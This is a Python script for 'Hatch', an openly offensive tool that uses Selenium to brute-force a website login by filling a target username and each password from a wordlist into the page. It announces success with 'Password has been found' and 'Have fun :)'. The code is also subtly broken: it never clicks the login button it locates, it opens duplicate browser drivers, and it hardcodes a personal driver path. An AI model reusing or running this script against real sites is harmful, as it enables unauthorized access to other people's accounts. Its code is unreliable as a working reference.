import sys
import datetime
import selenium
import requests
import time as t
from sys import stdout
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from termcolor import colored, cprint

driverpath = input(colored('Insert the path to your downloaded drivers: '))

parser = OptionParser()
now = datetime.datetime.now()

class color:
   GREEN = '\033[92m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   CWHITE  = '\33[37m'

parser.add_option("-u", "--username", dest="username",help="Choose the username")
parser.add_option("--usernamesel", dest="usernamesel",help="Choose the username selector")
parser.add_option("--passsel", dest="passsel",help="Choose the password selector")
parser.add_option("--loginsel", dest="loginsel",help= "Choose the login button selector")
parser.add_option("--passlist", dest="passlist",help="Enter the password list directory")
parser.add_option("--website", dest="website",help="choose a website")
(options, args) = parser.parse_args()

def wizard():
    print(banner)
    website = input(colored('\n[~] ', 'green', attrs=['bold']) + 'Enter a Website: ')
    print(colored('[!] ', 'green', attrs=['bold']) + 'Checking if site exists')
    sys.stdout.flush()
    t.sleep(1)
    try:
        request = requests.get(website)
        if request.status_code == 200:
            print(colored('[OK]', 'green', attrs=['bold']))
            sys.stdout.flush()
    except selenium.common.exceptions.NoSuchElementException:
        pass
    except KeyboardInterrupt:
        print(colored('[!]', 'red', attrs=['bold']) + ' User used Ctrl-c to exit')
        exit()
    except:
        t.sleep(1)
        print(colored('[X]', 'red', attrs=['bold']))
        t.sleep(1)
        print(colored('[!]', 'red', attrs=['bold']) + ' Website could not be located make sure to use http / https')
        exit()

    username_selector = input(colored('[~] ', 'green', attrs=['bold']) + 'Enter the username selector: ')
    password_selector = input(colored('[~] ', 'green', attrs=['bold']) + 'Enter the password selector: ')
    login_btn_selector = input(colored('[~] ', 'green', attrs=['bold']) + 'Enter the Login button selector: ')
    username = input(colored('[~] ', 'green', attrs=['bold']) + 'Enter the username to brute force: ')
    pass_list = input(colored('[~] ', 'green', attrs=['bold']) + 'Enter a directory to a password list: ')
    brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website)

def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website):
    f = open(pass_list, 'r')
    driver = webdriver.Chrome(driverpath)
    optionss = webdriver.ChromeOptions()
    optionss.add_argument("--disable-popup-blocking")
    optionss.add_argument("--disable-extensions")
    count = 1
    browser = webdriver.Chrome('/Users/benstokmans/Downloads/chromedriver', options=optionss)
    while True:
        try:
            for line in f:
                browser.get(website)
                t.sleep(2)
                Sel_user = browser.find_element_by_css_selector(username_selector)
                Sel_pas = browser.find_element_by_css_selector(password_selector)
                enter = browser.find_element_by_css_selector(login_btn_selector)
                Sel_user.send_keys(username)
                Sel_pas.send_keys(line)
                print('------------------------')
                print(colored('Tried password: ', 'green') + colored(line, 'red') + colored('for user: ', 'green') + colored(username, 'red'))
                print('------------------------')
            opt = input(colored('Do you want to do it again? [Y/N]', 'yellow'))
        except KeyboardInterrupt:
            exit()
        except selenium.common.exceptions.NoSuchElementException:
            print('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS!')
            print('LAST PASS ATTEMPT BELLOW')
            print(colored('Password has been found: ' + str(line), 'green'))
            print(colored('Have fun :)', 'yellow', attrs=['bold']))
            exit()


driver = webdriver.Chrome(driverpath)
optionss = webdriver.ChromeOptions()
optionss.add_argument("--disable-popup-blocking")
optionss.add_argument("--disable-extensions")
count = 1


banner = color.BOLD + color.RED +'''
  _    _       _       _
 | |  | |     | |     | |
 | |__| | __ _| |_ ___| |__
 |  __  |/ _` | __/ __| '_ \\
 | |  | | (_| | || (__| | | |
 |_|  |_|\__,_|\__\___|_| |_|
  {0}[{1}-{2}]--> {3}V.1.0
  {4}[{5}-{6}]--> {7}coded by Metachar
  {4}[{5}-{6}]--> {7}recoded by OsOmE1
  {8}[{9}-{10}]-->{11} brute-force tool                      '''.format(color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN)

if options.username == None:
    if options.usernamesel == None:
        if options.passsel == None:
            if options.loginsel == None:
                if options.passlist == None:
                    if options.website == None:
                        wizard()

username = options.username
username_selector = options.usernamesel
password_selector = options.passsel
login_btn_selector = options.loginsel
website = options.website
pass_list = options.passlist

print(banner)
brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
